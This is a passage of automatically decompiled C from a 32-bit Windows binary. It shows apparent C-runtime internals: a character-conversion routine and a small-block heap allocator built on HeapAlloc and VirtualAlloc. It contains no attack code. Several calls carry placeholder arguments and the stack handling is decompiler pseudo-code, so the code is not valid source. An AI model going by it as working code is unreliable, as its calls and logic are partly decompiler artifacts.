int32_t function_403e5b(int32_t a1, int32_t a2) {
    int32_t v1 = &g138; // bp-20, 0x403e66
    InterlockedIncrement(&g138);
    bool v2 = true; // 0x403e7b
    int32_t * v3 = &v1; // 0x403e7b
    if (g137 != 0) {
        int32_t v4 = &g138; // bp-24, 0x403e7d
        InterlockedDecrement(&g138);
        function_403cab(19);
        v2 = false;
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    int32_t * v6 = (int32_t *)(v5 - 4); // 0x403e8b
    *v6 = a2;
    *(int32_t *)(v5 - 8) = a1;
    int32_t lpAddend = function_403eb4((int32_t)&g167, (int32_t)&g167); // 0x403e91
    if (v2) {
        // 0x403ea9
        *v6 = (int32_t)&g138;
        InterlockedDecrement((int32_t *)lpAddend);
    } else {
        // 0x403e9f
        *v6 = 19;
        function_403d0c(lpAddend);
    }
    // 0x403eac
    return lpAddend;
}

// Address range: 0x403eb4 - 0x403f1d
int32_t function_403eb4(int32_t lpMultiByteStr, int32_t a2) {
    int32_t v1 = 0x10000 * a2 / 0x10000;
    int32_t lpWideCharStr = v1;
    int32_t lpUsedDefaultChar = lpMultiByteStr;
    if (lpMultiByteStr == 0) {
        // 0x403ebe
        return lpMultiByteStr;
    }
    // 0x403ec0
    if (g131 == 0) {
        if ((int16_t)v1 < 256) {
            // 0x403ed4
            *(char *)lpMultiByteStr = (char)v1;
            return 1;
        }
        // 0x403f0d
        *(int32_t *)function_404bb7() = 42;
        // 0x403ebe
        return -1;
    }
    // 0x403edb
    lpUsedDefaultChar = 0;
    int32_t result = WideCharToMultiByte(g132, 544, (int16_t *)&lpWideCharStr, 1, (char *)lpMultiByteStr, g62, NULL, (bool *)&lpUsedDefaultChar); // 0x403efd
    if (result != 0 == lpUsedDefaultChar == 0) {
        // 0x403ebe
        return result;
    }
    // 0x403f0d
    *(int32_t *)function_404bb7() = 42;
    // 0x403ebe
    return -1;
}

// Address range: 0x404005 - 0x404043
int32_t function_404005(void) {
    int32_t * v1 = HeapAlloc((int32_t *)g152, 0, 320); // 0x404012
    int32_t result = (int32_t)v1; // 0x404012
    g151 = result;
    if (v1 == NULL) {
        // 0x404021
        return result;
    }
    // 0x404022
    g149 = 0;
    g150 = 0;
    g148 = result;
    g146 = 16;
    return 1;
}

// Address range: 0x404043 - 0x40406e
int32_t function_404043(int32_t a1) {
    uint32_t v1 = g151 + 20 * g150; // 0x404050
    if (g151 >= v1) {
        // 0x40406d
        return 0;
    }
    int32_t v2 = g151; // 0x404055
    int32_t result = v2; // 0x404064
    while (a1 - *(int32_t *)(v2 + 12) >= 0x100000) {
        // 0x404066
        v2 += 20;
        result = 0;
        if (v2 >= v1) {
            // break -> 0x40406d
            break;
        }
        result = v2;
    }
    // 0x40406d
    return result;
}

// Address range: 0x40406e - 0x404399
int32_t function_40406e(int32_t a1, int32_t a2) {
    int32_t v1 = *(int32_t *)(a1 + 16); // 0x40407c
    int32_t v2 = a2 - 4; // 0x404084
    int32_t v3 = *(int32_t *)v2; // 0x404084
    int32_t v4 = (a2 - *(int32_t *)(a1 + 12)) / 0x8000; // 0x40408b
    int32_t v5 = *(int32_t *)(a2 - 8); // 0x404090
    int32_t v6 = v3 - 1; // 0x404099
    int32_t v7 = *(int32_t *)(v6 + v2); // 0x4040aa
    int32_t v8 = v6; // 0x4040b3
    if ((v7 & 1) == 0) {
        int32_t v9 = v3 + v2;
        int32_t * v10 = (int32_t *)(v9 + 3); // 0x4040c6
        int32_t * v11 = (int32_t *)(v9 + 7); // 0x4040ca
        if (*v10 == *v11) {
            uint32_t v12 = v7 / 16 - 1; // 0x4040ba
            uint32_t v13 = v12 < 63 ? v12 : 63;
            int32_t v14 = v1 + 4 + v13;
            int32_t v15 = -1 - (0x80000000 >> (v13 & 31));
            int32_t v16 = 4 * v4;
            if (v13 >= 32) {
                int32_t * v17 = (int32_t *)(v1 + 196 + v16); // 0x404107
                *v17 = *v17 & v15;
                char * v18 = (char *)v14; // 0x40410e
                char v19 = *v18 - 1; // 0x40410e
                *v18 = v19;
                if (v19 == 0) {
                    int32_t * v20 = (int32_t *)(a1 + 4); // 0x404115
                    *v20 = *v20 & v15;
                }
            } else {
                int32_t * v21 = (int32_t *)(v1 + 68 + v16); // 0x4040e5
                *v21 = *v21 & v15;
                char * v22 = (char *)v14; // 0x4040e9
                char v23 = *v22 - 1; // 0x4040e9
                *v22 = v23;
                if (v23 == 0) {
                    int32_t * v24 = (int32_t *)a1; // 0x4040f0
                    *v24 = *v24 & v15;
                }
            }
        }
        // 0x404118
        *(int32_t *)(*v11 + 4) = *v10;
        *(int32_t *)(*v10 + 8) = *v11;
        v8 = v7 + v6;
    }
    int32_t result = v1 + 324 + 516 * v4; // 0x40409d
    int32_t v25; // 0x40406e
    int32_t v26; // 0x40406e
    int32_t v27; // 0x40406e
    int32_t v28; // 0x40406e
    int32_t v29; // 0x40406e
    int32_t * v30; // 0x40406e
    int32_t * v31; // 0x40406e
    if ((v5 & 1) != 0) {
        uint32_t v32 = v8 / 16 - 1; // 0x404139
        v31 = (int32_t *)(a2 + 4);
        v30 = (int32_t *)a2;
        v25 = v32 < 63 ? v32 : 63;
        v26 = v2;
        v28 = v8;
        goto lab_0x404200;
    } else {
        int32_t v33 = v2 - v5; // 0x404151
        uint32_t v34 = v5 / 16 - 1; // 0x40415f
        uint32_t v35 = v34 < 63 ? v34 : 63;
        int32_t v36 = v8 + v5; // 0x40416d
        uint32_t v37 = v36 / 16 - 1; // 0x404178
        int32_t v38 = v37 < 63 ? v37 : 63;
        v27 = v33;
        v29 = v36;
        if (v35 == v38) {
            goto lab_0x404289;
        } else {
            // 0x404183
            v30 = (int32_t *)(v33 + 4);
            v31 = (int32_t *)(v33 + 8);
            if (*v30 == *v31) {
                uint32_t v39 = v35 & 31;
                if (v35 >= 32) {
                    int32_t v40 = -1 - (0x80000000 >> v39);
                    int32_t * v41 = (int32_t *)(v1 + 196 + 4 * v4); // 0x4041c5
                    *v41 = *v41 & v40;
                    char * v42 = (char *)(v1 + 4 + v35); // 0x4041cc
                    char v43 = *v42 - 1; // 0x4041cc
                    *v42 = v43;
                    if (v43 == 0) {
                        int32_t * v44 = (int32_t *)(a1 + 4); // 0x4041d3
                        *v44 = *v44 & v40;
                    }
                } else {
                    int32_t v45 = v39 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v39);
                    int32_t * v46 = (int32_t *)(v1 + 68 + 4 * v4); // 0x4041a3
                    *v46 = *v46 & v45;
                    char * v47 = (char *)(v1 + 4 + v35); // 0x4041a7
                    char v48 = *v47 - 1; // 0x4041a7
                    *v47 = v48;
                    if (v48 == 0) {
                        int32_t * v49 = (int32_t *)a1; // 0x4041ae
                        *v49 = *v49 & v45;
                    }
                }
            }
            // 0x4041f1
            *(int32_t *)(*v31 + 4) = *v30;
            *(int32_t *)(*v30 + 8) = *v31;
            v25 = v38;
            v26 = v33;
            v28 = v36;
            goto lab_0x404200;
        }
    }
  lab_0x404200:;
    int32_t v50 = 8 * v25 + result; // 0x404203
    int32_t * v51 = (int32_t *)(v50 + 4); // 0x404206
    *v30 = *v51;
    *v31 = v50;
    *v51 = v26;
    *(int32_t *)(*v30 + 8) = v26;
    v27 = v26;
    v29 = v28;
    if (*v30 == *v31) {
        char * v52 = (char *)(v1 + 4 + v25); // 0x404226
        char v53 = *v52; // 0x404226
        *v52 = v53 + 1;
        int32_t v54 = 0x80000000 >> (v25 & 31);
        if (v25 >= 32) {
            if (v53 == 0) {
                int32_t * v55 = (int32_t *)(a1 + 4); // 0x404270
                *v55 = *v55 | v54;
            }
            int32_t * v56 = (int32_t *)(v1 + 196 + 4 * v4); // 0x404284
            *v56 = *v56 | v54;
            v27 = v26;
            v29 = v28;
        } else {
            if (v53 == 0) {
                int32_t * v57 = (int32_t *)a1; // 0x40424a
                *v57 = *v57 | v54;
            }
            int32_t * v58 = (int32_t *)(v1 + 68 + 4 * v4); // 0x404259
            *v58 = *v58 | v54;
            v27 = v26;
            v29 = v28;
        }
    }
    goto lab_0x404289;
  lab_0x404289:;
    int32_t v59 = v29;
    *(int32_t *)v27 = v59;
    *(int32_t *)(v27 - 4 + v59) = v59;
    int32_t * v60 = (int32_t *)result; // 0x404292
    int32_t v61 = *v60 - 1; // 0x404292
    *v60 = v61;
    if (v61 != 0) {
        // 0x404394
        return result;
    }
    int32_t v62 = g149; // 0x40429a
    int32_t result2 = a1; // 0x4042a1
    if (v62 != 0) {
        // 0x4042a7
        int32_t lpAddress; // bp-36, 0x40406e
        int32_t v63 = &lpAddress; // 0x40408a
        *(int32_t *)(v63 - 4) = 0x4000;
        *(int32_t *)(v63 - 8) = 0x8000;
        *(int32_t *)(v63 - 12) = 0x8000 * g147 + *(int32_t *)(v62 + 12);
        int32_t dwSize; // 0x40406e
        int32_t dwFreeType; // 0x40406e
        VirtualFree((int32_t *)lpAddress, dwSize, dwFreeType);
        int32_t * v64 = (int32_t *)(g149 + 8); // 0x4042d9
        *v64 = *v64 | 0x80000000 >> (g147 & 31);
        *(int32_t *)(*(int32_t *)(g149 + 16) + 196 + 4 * g147) = 0;
        char * v65 = (char *)(*(int32_t *)(g149 + 16) + 67); // 0x4042fa
        *v65 = *v65 - 1;
        int32_t v66 = g149; // 0x4042fd
        int32_t v67 = v66; // 0x404309
        if (*(char *)(*(int32_t *)(v66 + 16) + 67) == 0) {
            int32_t * v68 = (int32_t *)(v66 + 4); // 0x40430b
            *v68 = *v68 & -2;
            v67 = g149;
        }
        // 0x404314
        result2 = a1;
        if (*(int32_t *)(v67 + 8) == -1) {
            // 0x40431a
            *(int32_t *)(v63 - 16) = 0x8000;
            *(int32_t *)(v63 - 20) = 0;
            *(int32_t *)(v63 - 24) = *(int32_t *)(v67 + 12);
            VirtualFree(&g167, (int32_t)&g167, (int32_t)&g167);
            *(int32_t *)(v63 - 28) = *(int32_t *)(g149 + 16);
            *(int32_t *)(v63 - 32) = 0;
            *(int32_t *)(v63 - 36) = g152;
            HeapFree(&g167, (int32_t)&g167, &g167);
            *(int32_t *)(v63 - 40) = 20 * g150 - 20 + g151 - g149;
            *(int32_t *)(v63 - 44) = g149 + 20;
            *(int32_t *)(v63 - 48) = g149;
            function_406750((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
            g150--;
            g148 = g151;
            result2 = g149 < a1 ? a1 - 20 : a1;
        }
    }
    // 0x404389
    g149 = result2;
    g147 = v4;
    // 0x404394
    return result2;
}

// Address range: 0x404399 - 0x4046a2
int32_t function_404399(int32_t a1) {
    uint32_t v1 = g151 + 20 * g150; // 0x4043b0
    int32_t v2 = a1 + 23; // 0x4043b9
    int32_t v3 = v2 / 16 - 1; // 0x4043c5
    int32_t v4 = 0xffffffff >> (v3 & 31);
    int32_t v5 = v3 > 31 ? v4 : -1;
    int32_t v6 = v3 > 31 ? 0 : v4;
    uint32_t v7 = g148; // 0x4043e9
    int32_t v8 = v7; // 0x4043f5
    int32_t v9 = v7; // 0x4043f5
    if (v7 < v1) {
        int32_t v10 = *(int32_t *)v8; // 0x4043fa
        v9 = v8;
        while ((v10 & v6 | *(int32_t *)(v8 + 4) & v5) == 0) {
            // 0x404405
            v8 += 20;
            v9 = v8;
            if (v8 >= v1) {
                // break -> 0x404410
                break;
            }
            v10 = *(int32_t *)v8;
            v9 = v8;
        }
    }
    int32_t v11 = v9; // 0x404413
    if (v9 == v1) {
        int32_t v12 = g151; // 0x40441c
        int32_t v13 = g151; // 0x40441c
        if (g151 < v7) {
            int32_t v14 = *(int32_t *)(v12 + 4); // 0x40441e
            v13 = v12;
            while ((*(int32_t *)v12 & v6 || v14 & v5) == 0) {
                int32_t v15 = v12 + 20; // 0x40442c
                v12 = v15;
                v13 = v15;
                if (v15 >= v7) {
                    // break -> 0x404433
                    break;
                }
                v14 = *(int32_t *)(v12 + 4);
                v13 = v12;
            }
        }
        // 0x404433
        v11 = v13;
        if (v13 == v7) {
            int32_t v16 = v13; // 0x404438
            int32_t v17 = v13; // 0x404438
            if (v13 < v1) {
                v17 = v16;
                while (*(int32_t *)(v16 + 8) == 0) {
                    int32_t v18 = v16 + 20; // 0x404440
                    v16 = v18;
                    v17 = v18;
                    if (v18 >= v1) {
                        // break -> 0x40444b
                        break;
                    }
                    v17 = v16;
                }
            }
            int32_t v19 = v17; // 0x40444b
            if (v17 == v1) {
                int32_t v20 = g151; // 0x404454
                int32_t v21 = g151; // 0x404454
                if (g151 < v7) {
                    v21 = v20;
                    while (*(int32_t *)(v20 + 8) == 0) {
                        int32_t v22 = v20 + 20; // 0x40445c
                        v20 = v22;
                        v21 = v22;
                        if (v22 >= v7) {
                            // break -> 0x404463
                            break;
                        }
                        v21 = v20;
                    }
                }
                // 0x404463
                v19 = v21;
                if (v21 == v7) {
                    int32_t v23 = function_4046a2(v21); // 0x404465
                    v19 = v23;
                    if (v23 == 0) {
                        // 0x40469d
                        return 0;
                    }
                }
            }
            int32_t v24 = function_404753(v19); // 0x404474
            int32_t * v25 = (int32_t *)(v19 + 16); // 0x40447a
            *(int32_t *)*v25 = v24;
            v11 = v19;
            if (*(int32_t *)*v25 == -1) {
                // 0x40469d
                return 0;
            }
        }
    }
    // 0x40448e
    g148 = v11;
    int32_t v26 = *(int32_t *)(v11 + 16); // 0x404494
    int32_t * v27 = (int32_t *)v26; // 0x404497
    int32_t v28 = *v27; // 0x404497
    int32_t v29; // 0x404399
    int32_t v30; // 0x404399
    int32_t v31; // 0x404399
    if (v28 == -1) {
        // 0x40448e
        v29 = v26 + 68;
        v30 = v26 + 196;
        goto lab_0x4044b5;
    } else {
        int32_t v32 = 4 * v28; // 0x4044a1
        int32_t v33 = v26 + 196;
        int32_t v34 = v26 + 68;
        int32_t v35 = *(int32_t *)(v32 + v34); // 0x4044a8
        v29 = v34;
        v30 = v33;
        v31 = v28;
        if ((v35 & v6 || *(int32_t *)(v32 + v33) & v5) != 0) {
            goto lab_0x4044ec;
        } else {
            goto lab_0x4044b5;
        }
    }
  lab_0x4044b5:;
    int32_t v36 = *(int32_t *)v29; // 0x4044bb
    v31 = 0;
    if ((v36 & v6 || *(int32_t *)v30 & v5) == 0) {
        int32_t v37 = v29;
        int32_t v38 = 1; // 0x4044d8
        int32_t v39 = v37 + 4; // 0x4044de
        int32_t v40 = *(int32_t *)v39; // 0x4044e3
        int32_t v41 = v38; // 0x4044e7
        v31 = v38;
        while ((v40 & v6 | *(int32_t *)(v37 + 132) & v5) == 0) {
            // 0x4044d2
            v37 = v39;
            v38 = v41 + 1;
            v39 = v37 + 4;
            v40 = *(int32_t *)v39;
            v41 = v38;
            v31 = v38;
        }
    }
    goto lab_0x4044ec;
  lab_0x4044ec:;
    int32_t v42 = 4 * v31; // 0x404500
    int32_t * v43 = (int32_t *)(v42 + v26 + 68); // 0x404500
    int32_t v44 = *v43; // 0x404500
    int32_t v45 = v44 & v6; // 0x404504
    int32_t v46 = v45; // 0x404506
    int32_t v47 = 0; // 0x404506
    if (v45 == 0) {
        // 0x404508
        v46 = *(int32_t *)(v26 + 196 + v42) & v5;
        v47 = 32;
    }
    int32_t v48 = v47; // 0x404517
    if (v46 >= 0) {
        int32_t v49 = 2 * v46; // 0x404519
        int32_t v50 = v47 + 1; // 0x40451b
        int32_t v51 = v50; // 0x404517
        int32_t v52 = v49; // 0x404517
        v48 = v50;
        while (v49 >= 0) {
            // 0x404519
            v49 = 2 * v52;
            v50 = v51 + 1;
            v51 = v50;
            v52 = v49;
            v48 = v50;
        }
    }
    int32_t v53 = v2 & -16; // 0x4043bc
    int32_t v54 = v26 + 324 + 516 * v31; // 0x4044f6
    int32_t v55 = v54 + 4; // 0x404521
    int32_t v56 = *(int32_t *)(8 * v48 + v55); // 0x404521
    int32_t * v57 = (int32_t *)v56; // 0x404525
    int32_t v58 = *v57 - v53; // 0x404527
    int32_t v59 = v58 < 1040 ? v58 / 16 - 1 : 63;
    if (v59 == v48) {
        if (v58 == 0) {
            goto lab_0x40465f;
        } else {
            // 0x404654
            *v57 = v58;
            *(int32_t *)(v58 + v56 - 4) = v58;
            goto lab_0x40465f;
        }
    } else {
        int32_t * v60 = (int32_t *)(v56 + 4); // 0x404543
        int32_t * v61 = (int32_t *)(v56 + 8); // 0x404546
        if (*v60 == *v61) {
            uint32_t v62 = v48 & 31;
            if (v48 > 31) {
                int32_t v63 = -1 - (0x80000000 >> v62);
                int32_t * v64 = (int32_t *)(v26 + 196 + v42); // 0x404595
                *v64 = *v64 & v63;
                char * v65 = (char *)(v26 + 4 + v48); // 0x404597
                char v66 = *v65 - 1; // 0x404597
                *v65 = v66;
                if (v66 == 0) {
                    int32_t * v67 = (int32_t *)(v11 + 4); // 0x4045a4
                    *v67 = *v67 & v63;
                }
            } else {
                int32_t v68 = v62 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v62);
                *v43 = v68 & v44;
                char * v69 = (char *)(v26 + 4 + v48); // 0x40456d
                char v70 = *v69 - 1; // 0x40456d
                *v69 = v70;
                if (v70 == 0) {
                    int32_t * v71 = (int32_t *)v11; // 0x404577
                    *v71 = *v71 & v68;
                }
            }
        }
        // 0x4045ac
        *(int32_t *)(*v61 + 4) = *v60;
        *(int32_t *)(*v60 + 8) = *v61;
        if (v58 == 0) {
            goto lab_0x40465f;
        } else {
            int32_t v72 = 8 * v59; // 0x4045cb
            int32_t v73 = v72 + v54; // 0x4045cf
            *v60 = *(int32_t *)(v72 + v55);
            *v61 = v73;
            *(int32_t *)(v73 + 4) = v56;
            *(int32_t *)(*v60 + 8) = v56;
            if (*v60 == *v61) {
                char * v74 = (char *)(v26 + 4 + v59); // 0x4045e9
                char v75 = *v74; // 0x4045e9
                *v74 = v75 + 1;
                int32_t v76 = 0x80000000 >> (v59 & 31);
                if (v59 > 31) {
                    if (v75 == 0) {
                        int32_t * v77 = (int32_t *)(v11 + 4); // 0x404634
                        *v77 = *v77 | v76;
                    }
                    int32_t * v78 = (int32_t *)(v26 + 196 + v42); // 0x40464b
                    *v78 = *v78 | v76;
                } else {
                    if (v75 == 0) {
                        int32_t * v79 = (int32_t *)v11; // 0x40460a
                        *v79 = *v79 | v76;
                    }
                    // 0x40460c
                    *v43 = *v43 | v76;
                }
            }
            // 0x404654
            *v57 = v58;
            *(int32_t *)(v58 + v56 - 4) = v58;
            goto lab_0x40465f;
        }
    }
  lab_0x40465f:;
    int32_t v80 = v58 + v56; // 0x404662
    int32_t v81 = v53 | 1; // 0x404664
    *(int32_t *)v80 = v81;
    *(int32_t *)(v53 - 4 + v80) = v81;
    int32_t * v82 = (int32_t *)v54; // 0x404670
    int32_t v83 = *v82; // 0x404670
    *v82 = v83 + 1;
    if (v83 != 0 || v11 != g149) {
        // 0x404695
        *v27 = v31;
        // 0x40469d
        return v80 + 4;
    }
    // 0x404683
    if (g147 == v31) {
        // 0x40468e
        g149 = 0;
    }
    // 0x404695
    *v27 = v31;
    // 0x40469d
    return v80 + 4;
}

// Address range: 0x4046a2 - 0x404753
int32_t function_4046a2(int32_t a1) {
    int32_t v1 = g150; // 0x4046a2
    int32_t v2 = g146; // 0x4046a7
    int32_t v3; // 0x4046a2
    int32_t v4; // 0x4046a2
    int32_t * v5; // 0x4046a2
    if (v1 != v2) {
        // 0x4046a2
        v3 = g151;
        v4 = v1;
        int32_t v6; // bp-8, 0x4046a2
        v5 = &v6;
    } else {
        int32_t v7 = g152; // bp-24, 0x4046c4
        int32_t * v8 = HeapReAlloc((int32_t *)g152, 0, (int32_t *)g151, 4 * (v2 + 80 + 4 * v2)); // 0x4046ca
        if (v8 == NULL) {
            // 0x404750
            return 0;
        }
        int32_t v9 = (int32_t)v8; // 0x4046ca
        g146 += 16;
        g151 = v9;
        v3 = v9;
        v4 = g150;
        v5 = &v7;
    }
    int32_t v10 = (int32_t)v5;
    *(int32_t *)(v10 - 4) = 0x41c4;
    *(int32_t *)(v10 - 8) = 8;
    *(int32_t *)(v10 - 12) = g152;
    int32_t v11 = 20 * v4 + v3; // 0x4046fb
    int32_t * v12 = HeapAlloc(&g167, (int32_t)&g167, (int32_t)&g167); // 0x4046fe
    int32_t * v13 = (int32_t *)(v11 + 16); // 0x404706
    *v13 = (int32_t)v12;
    if (v12 == NULL) {
        // 0x404750
        return 0;
    }
    // 0x40470b
    *(int32_t *)(v10 - 16) = 4;
    *(int32_t *)(v10 - 20) = 0x2000;
    *(int32_t *)(v10 - 24) = 0x100000;
    *(int32_t *)(v10 - 28) = 0;
    int32_t * memory = VirtualAlloc(&g167, (int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x404718
    *(int32_t *)(v11 + 12) = (int32_t)memory;
    int32_t result; // 0x4046a2
    if (memory != NULL) {
        // 0x404739
        *(int32_t *)(v11 + 8) = -1;
        *(int32_t *)v11 = 0;
        *(int32_t *)(v11 + 4) = 0;
        g150++;
        *(int32_t *)*v13 = -1;
        result = v11;
    } else {
        // 0x404725
        *(int32_t *)(v10 - 32) = *v13;
        *(int32_t *)(v10 - 36) = 0;
        *(int32_t *)(v10 - 40) = g152;
        HeapFree(&g167, (int32_t)&g167, &g167);
        result = 0;
    }
    // 0x404750
    return result;
}

// Address range: 0x404753 - 0x40484e
int32_t function_404753(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 16); // 0x40475d
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x404760
    uint32_t v3 = *v2; // 0x404760
    int32_t v4 = 0; // 0x404767
    int32_t v5 = v3; // 0x404767
    int32_t result = 0; // 0x404767
    if (v3 >= 0) {
        v5 *= 2;
        v4++;
        result = v4;
        while (v5 >= 0) {
            // 0x404769
            v5 *= 2;
            v4++;
            result = v4;
        }
    }
    int32_t v6 = v1 + 324 + 516 * result; // 0x404779
    int32_t v7 = v6; // 0x404780
    for (int32_t i = 63; i > 0; i--) {
        int32_t v8 = v7;
        v7 = v8 + 8;
        *(int32_t *)v7 = v8;
        *(int32_t *)(v8 + 4) = v8;
    }
    uint32_t lpAddress = *(int32_t *)(a1 + 12) + 0x8000 * result; // 0x404796
    if (VirtualAlloc((int32_t *)lpAddress, 0x8000, 0x1000, 4) == NULL) {
        // 0x404849
        return -1;
    }
    if (lpAddress < 0xffff9000) {
        int32_t v9 = lpAddress + 16;
        *(int32_t *)(v9 - 8) = -1;
        *(int32_t *)(v9 + 4076) = -1;
        *(int32_t *)(v9 - 4) = 4080;
        *(int32_t *)v9 = v9 + 4092;
        *(int32_t *)(v9 + 4) = v9 - 0x1004;
        *(int32_t *)(v9 + 4072) = 4080;
        int32_t v10 = v9 + 0x1000; // 0x4047fa
        while (v9 + 4080 <= lpAddress + 0x7000) {
            // 0x4047c3
            v9 = v10;
            *(int32_t *)(v9 - 8) = -1;
            *(int32_t *)(v9 + 4076) = -1;
            *(int32_t *)(v9 - 4) = 4080;
            *(int32_t *)v9 = v9 + 4092;
            *(int32_t *)(v9 + 4) = v9 - 0x1004;
            *(int32_t *)(v9 + 4072) = 4080;
            v10 = v9 + 0x1000;
        }
    }
    int32_t v11 = v6 + 504; // 0x404802
    *(int32_t *)(v6 + 508) = lpAddress + 12;
    *(int32_t *)(lpAddress + 20) = v11;
    *(int32_t *)(v6 + 512) = lpAddress + 0x700c;
    *(int32_t *)(lpAddress + 0x7010) = v11;
    int32_t v12 = 4 * result + v1;
    *(int32_t *)(v12 + 68) = 0;
    *(int32_t *)(v12 + 196) = 1;
    char * v13 = (char *)(v1 + 67); // 0x404825
    char v14 = *v13; // 0x404825
    *v13 = v14 + 1;
    if (v14 == 0) {
        int32_t * v15 = (int32_t *)(a1 + 4); // 0x404836
        *v15 = *v15 | 1;
    }
    uint32_t v16 = result & 31; // 0x404840
    *v2 = *v2 & (v16 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v16));
    // 0x404849
    return result;
}

// Address range: 0x40484e - 0x404b44
int32_t function_40484e(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = *(int32_t *)(a1 + 16); // 0x404868
    uint32_t v2 = a3 + 23 & -16; // 0x40486b
    uint32_t v3 = (a2 - *(int32_t *)(a1 + 12)) / 0x8000; // 0x40486e
    int32_t v4 = v1 + 324 + 516 * v3; // 0x404879
    int32_t v5 = a2 - 4; // 0x404883
    int32_t * v6 = (int32_t *)v5; // 0x404883
    int32_t v7 = *v6; // 0x404883
    uint32_t v8 = v7 - 1; // 0x404886
    int32_t v9 = a2 - 5 + v7; // 0x40488c
    int32_t v10 = *(int32_t *)v9; // 0x40488c
    char v11 = v10; // 0x404894
    int32_t v12; // bp-28, 0x40484e
    if (v8 < v2) {
        // 0x40489d
        if (v2 > v10 + v8 || (v10 & 1) != 0) {
            // 0x404b3f
            return 0;
        }
        int32_t * v13 = (int32_t *)(v9 + 4); // 0x4048c5
        int32_t * v14 = (int32_t *)(v9 + 8); // 0x4048c8
        if (*v13 == *v14) {
            uint32_t v15 = (int32_t)(v11 / 16 - 1); // 0x4048b6
            uint32_t v16 = v15 < 63 ? v15 : 63;
            uint32_t v17 = v16 & 31;
            if (v16 >= 32) {
                int32_t v18 = -1 - (0x80000000 >> v17);
                int32_t * v19 = (int32_t *)(v1 + 196 + 4 * v3); // 0x404904
                *v19 = *v19 & v18;
                char * v20 = (char *)(v1 + 4 + v16); // 0x40490b
                char v21 = *v20 - 1; // 0x40490b
                *v20 = v21;
                if (v21 == 0) {
                    int32_t * v22 = (int32_t *)(a1 + 4); // 0x404912
                    *v22 = *v22 & v18;
                }
            } else {
                int32_t v23 = v17 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v17);
                int32_t * v24 = (int32_t *)(v1 + 68 + 4 * v3); // 0x4048e2
                *v24 = *v24 & v23;
                char * v25 = (char *)(v1 + 4 + v16); // 0x4048e6
                char v26 = *v25 - 1; // 0x4048e6
                *v25 = v26;
                if (v26 == 0) {
                    int32_t * v27 = (int32_t *)a1; // 0x4048ed
                    *v27 = *v27 & v23;
                }
            }
        }
        // 0x404915
        *(int32_t *)(*v14 + 4) = *v13;
        *(int32_t *)(*v13 + 8) = *v14;
        int32_t v28 = 0x1000000 * v10 / 0x1000000 + v8 - v2; // 0x40492c
        int32_t v29; // 0x40484e
        if (v28 < 1) {
            // 0x404915
            v29 = v2 + a2;
        } else {
            uint32_t v30 = (int32_t)((char)v28 / 16 - 1); // 0x404942
            int32_t v31 = v2 + v5; // 0x404943
            int32_t v32 = v30 < 63 ? v30 : 63;
            int32_t v33 = 8 * v32 + v4; // 0x404952
            int32_t * v34 = (int32_t *)(v33 + 4); // 0x404958
            int32_t v35 = v2 + a2;
            int32_t * v36 = (int32_t *)v35; // 0x40495b
            *v36 = *v34;
            int32_t * v37 = (int32_t *)(v31 + 8); // 0x404961
            *v37 = v33;
            *v34 = v31;
            *(int32_t *)(*v36 + 8) = v31;
            if (*v36 == *v37) {
                char * v38 = (char *)(v1 + 4 + v32); // 0x404975
                char v39 = *v38; // 0x404975
                *v38 = v39 + 1;
                int32_t v40; // 0x40484e
                int32_t v41; // 0x40484e
                if (v32 >= 32) {
                    if (v39 == 0) {
                        int32_t * v42 = (int32_t *)(a1 + 4); // 0x4049bb
                        *v42 = *v42 | 0x80000000 >> (v32 & 31);
                    }
                    // 0x4049be
                    v40 = v1 + 196 + 4 * v3;
                    v41 = v32 - 32;
                } else {
                    if (v39 == 0) {
                        int32_t * v43 = (int32_t *)a1; // 0x404999
                        *v43 = *v43 | 0x80000000 >> (v32 & 31);
                    }
                    // 0x40499b
                    v40 = v1 + 68 + 4 * v3;
                    v41 = v32;
                }
                int32_t * v44 = (int32_t *)v40; // 0x4049cf
                *v44 = 0x80000000 >> (v41 & 31) | *v44;
            }
            int32_t v45 = 0x1000000 * v28 / 0x1000000; // 0x4049d4
            *(int32_t *)v31 = v45;
            *(int32_t *)(v31 - 4 + v45) = v45;
            v29 = v35;
        }
        int32_t v46 = v2 | 1; // 0x4049e6
        *v6 = v46;
        *(int32_t *)(v29 - 8) = v46;
        // 0x404b3c
        *(int32_t *)((int32_t)&v12 - 4) = 1;
        // 0x404b3f
        return 1;
    }
    if (v8 <= v2) {
        // 0x404b3c
        *(int32_t *)((int32_t)&v12 - 4) = 1;
        // 0x404b3f
        return 1;
    }
    int32_t v47 = v8 - v2; // 0x404a05
    int32_t v48 = v2 | 1; // 0x404a08
    *v6 = v48;
    int32_t v49 = v2 + v5; // 0x404a0e
    uint32_t v50 = v47 / 16 - 1; // 0x404a1b
    int32_t v51 = v49 - 4;
    *(int32_t *)v51 = v48;
    int32_t v52 = v47; // 0x404a2b
    int32_t v53 = v50 < 63 ? v50 : 63; // 0x404a2b
    if ((v11 & 1) == 0) {
        int32_t * v54 = (int32_t *)(v9 + 4); // 0x404a40
        int32_t * v55 = (int32_t *)(v9 + 8); // 0x404a43
        if (*v54 == *v55) {
            uint32_t v56 = (int32_t)(v11 / 16 - 1); // 0x404a37
            uint32_t v57 = v56 < 63 ? v56 : 63;
            uint32_t v58 = v57 & 31;
            if (v57 >= 32) {
                int32_t v59 = -1 - (0x80000000 >> v58);
                int32_t * v60 = (int32_t *)(v1 + 196 + 4 * v3); // 0x404a7b
                *v60 = *v60 & v59;
                char * v61 = (char *)(v1 + 4 + v57); // 0x404a82
                char v62 = *v61 - 1; // 0x404a82
                *v61 = v62;
                if (v62 == 0) {
                    int32_t * v63 = (int32_t *)(a1 + 4); // 0x404a89
                    *v63 = *v63 & v59;
                }
            } else {
                int32_t v64 = v58 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v58);
                int32_t * v65 = (int32_t *)(v1 + 68 + 4 * v3); // 0x404a5c
                *v65 = *v65 & v64;
                char * v66 = (char *)(v1 + 4 + v57); // 0x404a60
                char v67 = *v66 - 1; // 0x404a60
                *v66 = v67;
                if (v67 == 0) {
                    int32_t * v68 = (int32_t *)a1; // 0x404a67
